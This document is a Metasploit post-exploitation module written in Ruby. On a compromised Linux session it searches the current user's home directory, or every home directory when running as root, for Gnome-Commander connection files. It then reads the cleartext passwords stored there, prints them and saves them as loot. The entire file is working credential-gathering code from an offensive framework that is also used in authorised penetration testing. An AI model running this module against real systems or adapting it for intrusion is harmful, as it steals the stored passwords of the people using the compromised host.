##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather Gnome-Commander Creds',
        'Description'   => %q{
            This module collects the clear text passwords stored by
          Gnome-commander, a GUI file explorer for GNOME.  Typically, these
          passwords are stored in the user's home directory, at
          ~/.gnome-commander/connections.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'David Bloom' ], # Twitter: @philophobia78
        'Platform'      => %w{ linux },
        'SessionTypes'  => [ 'meterpreter', 'shell']
      ))
  end

  def run
    user_dirs = []
    # Search current user
    user = cmd_exec("whoami").chomp
    # User is root
    if user == 'root'
      print_status("Current user is #{user}, probing all home dirs")
      user_dirs << '/root'
      # Search home dirs
      cmd_exec('ls /home').each_line.map { |l| user_dirs << "/home/#{l}".chomp }
    else
      # Non root user
      print_status("Current user is #{user}, probing /home/#{user}")
      user_dirs << "/home/#{user}"
    end
    # Try to find connections file in users homes
    user_dirs.each do |dir|
      # gnome-commander connections file
      connections_file = "#{dir}/.gnome-commander/connections"
      if file?(connections_file)
        #File.exist
        begin
          str_file=read_file(connections_file)
          print_good("File found: #{connections_file}")
          vprint_line(str_file)
          #Store file
          p = store_loot("connections", "text/plain", session, str_file, connections_file, "Gnome-Commander connections")
          print_good("Connections file saved to #{p}")
        rescue EOFError
          # If there's nothing in the file, we hit EOFError
          print_error("Nothing read from file: #{connections_file}, file may be empty")
        end
      else
        # File not found
        vprint_error("File not found: #{connections_file}")
      end
    end
  end
end
